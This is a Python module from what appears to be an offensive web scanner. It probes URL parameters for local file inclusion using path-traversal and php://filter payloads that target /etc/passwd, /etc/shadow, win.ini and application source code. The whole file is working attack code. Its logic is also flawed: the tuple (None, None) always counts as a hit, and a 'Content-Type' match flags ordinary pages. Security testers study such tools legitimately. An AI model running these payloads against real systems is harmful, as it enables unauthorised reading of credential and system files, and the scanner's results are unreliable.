# modules/lfi.py
import urllib.parse
from core.colors import Colors
from utils.helpers import quote

class NPXLFIModule:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.vulnerabilities = []

    def test_lfi(self, url, param, value):
        """اختبار LFI باستخدام بايلودات متعددة"""
        payloads = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "..\\..\\..\\windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "/etc/passwd",
            "../../../etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]
        for payload in payloads:
            injected = url.replace(f"{param}={value}", f"{param}={quote(payload)}")
            try:
                response = self.session.send_request("GET", injected)
                if response:
                    content = response.text
                    if "root:x:0:0" in content:
                        return injected, "LFI: /etc/passwd read"
                    elif "[fonts]" in content or "for 16-bit" in content:
                        return injected, "LFI: windows/win.ini read"
                    elif "<?php" in content:
                        return injected, "LFI: PHP source code via php://filter"
                    elif "MIMEText" in content or "Content-Type" in content:
                        return injected, "LFI: file read via file://"
            except:
                pass
        return None, None

    def run(self, target_urls):
        print(f"{Colors.OKCYAN}[*] Module: LFI Scanner...{Colors.ENDC}")
        testable = [u for u in target_urls if '?' in u and '=' in u]
        print(f"{Colors.DIM}[*] Testing {len(testable)} URLs...{Colors.ENDC}")
        
        for url in testable:
            parsed = urllib.parse.urlparse(url)
            for part in parsed.query.split('&'):
                if '=' in part:
                    param, value = part.split('=', 1)
                    if param.lower() in ['file', 'page', 'path', 'include', 'doc', 'load', 'view', 'read']:
                        result = self.test_lfi(url, param, value)
                        if result:
                            vuln_url, details = result
                            self.vulnerabilities.append({
                                'type': 'LFI',
                                'url': vuln_url,
                                'details': details,
                                'param': param
                            })
                            print(f"{Colors.FAIL}[!] {details} at {vuln_url}{Colors.ENDC}")
        
        if not self.vulnerabilities:
            print(f"{Colors.DIM}[-] No LFI vulnerabilities found.{Colors.ENDC}")
        return self.vulnerabilities
